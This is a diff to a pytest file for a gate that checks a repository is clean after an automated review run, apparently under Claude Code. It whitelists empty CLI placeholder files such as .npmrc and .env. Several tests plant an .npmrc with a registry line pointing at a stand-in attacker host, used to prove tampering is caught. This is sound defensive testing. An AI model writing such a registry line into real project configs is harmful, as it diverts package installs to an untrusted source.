@@ -9,7 +9,9 @@ not read back from the module.
 import http.client
 import importlib.util
 import json
+import os
 import re
+import stat
 import subprocess
 import urllib.error
 from pathlib import Path
@@ -281,13 +283,123 @@ def test_stray_untracked_file_is_dirty():
     ],
     ids=["head-copy", "head-diff", "pycache", "dotenv", "head-prefix", "untracked-in-head"],
 )
-def test_ignored_files_are_dirty_outside_the_head_dir(line, dirty):
+def test_ignored_files_are_dirty_outside_the_head_dir(line, dirty, tmp_path):
     porcelain = f"?? .review/findings.json\n{line}\n"
-    assert gate.check_clean_tree(porcelain, ".review/findings.json", ".pr-head") == dirty
+    assert gate.check_clean_tree(porcelain, ".review/findings.json", ".pr-head", tmp_path) == dirty
+
+
+# Under CLAUDE_CODE_SUBPROCESS_ENV_SCRUB the CLI itself creates these before the
+# first tool call: a literal list, read out of the 2.1.296 and 2.1.314 binaries.
+# They are exempt only as what the CLI makes: an ignored, empty, regular file.
+CLI_STUBS = [
+    ".npmrc",
+    ".yarnrc",
+    ".yarnrc.yml",
+    "bunfig.toml",
+    "package.json",
+    ".gitmodules",
+    "package-lock.json",
+    "yarn.lock",
+    "pnpm-lock.yaml",
+    ".env",
+    ".env.local",
+    ".env.development",
+    ".env.development.local",
+    ".env.test",
+    ".env.test.local",
+    ".env.production",
+    ".env.production.local",
+]
+ACTION_STUB = ".claude-pr/.gitmodules"
+
+
+def _plant(root, name, content=""):
+    path = root / name
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(content, encoding="utf-8")
+    return path
+
+
+@pytest.mark.parametrize("name", [*CLI_STUBS, ACTION_STUB])
+def test_empty_ignored_cli_placeholder_is_not_dirty(name, tmp_path):
+    _plant(tmp_path, name)
+    assert gate.check_clean_tree(f"!! {name}\n", "f.json", ".pr-head", tmp_path) == []
+
+
+@pytest.mark.parametrize("name", [".npmrc", ".env", ".gitmodules", ACTION_STUB])
+def test_cli_placeholder_with_content_is_dirty(name, tmp_path):
+    _plant(tmp_path, name, "registry=https://attacker.example\n")
+    assert gate.check_clean_tree(f"!! {name}\n", "f.json", ".pr-head", tmp_path) == [name]
+
+
+@pytest.mark.parametrize("line", ["?? .npmrc", " M .npmrc", " D .npmrc", "A  .npmrc"])
+def test_cli_placeholder_name_outside_ignored_status_is_dirty(line, tmp_path):
+    # The CLI's stub is excluded, so it can only show as `!!`. A tracked file
+    # emptied by the review reads ` M` and is a change, whatever its name.
+    _plant(tmp_path, ".npmrc")
+    assert gate.check_clean_tree(f"{line}\n", "f.json", ".pr-head", tmp_path) == [".npmrc"]
+
+
+@pytest.mark.parametrize(
+    "name",
+    [".npmrc.bak", "sub/.npmrc", ".env.staging", ".claude-pr/.npmrc", "scripts"],
+)
+def test_empty_ignored_file_off_the_list_is_dirty(name, tmp_path):
+    _plant(tmp_path, name)
+    assert gate.check_clean_tree(f"!! {name}\n", "f.json", ".pr-head", tmp_path) == [name]
+
+
+def test_absent_cli_placeholder_is_dirty(tmp_path):
+    assert gate.check_clean_tree("!! .npmrc\n", "f.json", ".pr-head", tmp_path) == [".npmrc"]
+
+
+def test_directory_at_a_cli_placeholder_name_is_dirty(tmp_path):
+    (tmp_path / ".npmrc").mkdir()
+    assert gate.check_clean_tree("!! .npmrc\n", "f.json", ".pr-head", tmp_path) == [".npmrc"]
+
+
+def test_symlink_at_a_cli_placeholder_name_is_dirty(monkeypatch, tmp_path):
+    # Faked so it runs where a real symlink needs a privilege (Windows CI), and
+    # shaped so only lstat tells: stat follows the link to an empty regular file,
+    # and the link itself reports size 0 so the size test alone cannot catch it.
+    regular = os.stat_result((stat.S_IFREG | 0o644, 0, 0, 1, 0, 0, 0, 0, 0, 0))
+    link = os.stat_result((stat.S_IFLNK | 0o777, 0, 0, 1, 0, 0, 0, 0, 0, 0))
+    with monkeypatch.context() as patched:
+        patched.setattr(gate.os, "lstat", lambda _path: link)
+        patched.setattr(gate.os, "stat", lambda _path: regular)
+        dirty = gate.check_clean_tree("!! .env\n", "f.json", ".pr-head", tmp_path)
+    assert dirty == [".env"]
+
+
+def test_real_symlink_to_an_empty_file_is_dirty(tmp_path):
+    target = _plant(tmp_path, "elsewhere")
+    try:
+        (tmp_path / ".env").symlink_to(target)
+    except OSError:
+        pytest.skip("creating a symlink needs a privilege here")
+    assert gate.check_clean_tree("!! .env\n", "f.json", ".pr-head", tmp_path) == [".env"]
 
 
 def _git(cwd, *args):
     subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True)
+
+
+def test_check_tree_passes_cli_placeholders_on_a_real_status_and_fails_a_filled_one(
+    monkeypatch, tmp_path
+):
+    _git(tmp_path, "init", "-q")
+    _git(tmp_path, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "base")
+    (tmp_path / ".review").mkdir()
+    (tmp_path / ".review" / "findings.json").write_text("{}", encoding="utf-8")
+    exclude = ["/.claude-pr/"] + [f"/{name}" for name in CLI_STUBS]
+    (tmp_path / ".git" / "info" / "exclude").write_text("\n".join(exclude) + "\n", encoding="utf-8")
+    for name in [*CLI_STUBS, ACTION_STUB]:
+        _plant(tmp_path, name)
+    monkeypatch.chdir(tmp_path)
+    args = ["check-tree", "--findings", ".review/findings.json"]
+    assert gate.main(args) == 0
+    _plant(tmp_path, ".npmrc", "registry=https://attacker.example\n")
+    assert gate.main(args) == 1
 
 
 def test_check_tree_reports_a_gitignored_file_the_review_wrote(monkeypatch, tmp_path):
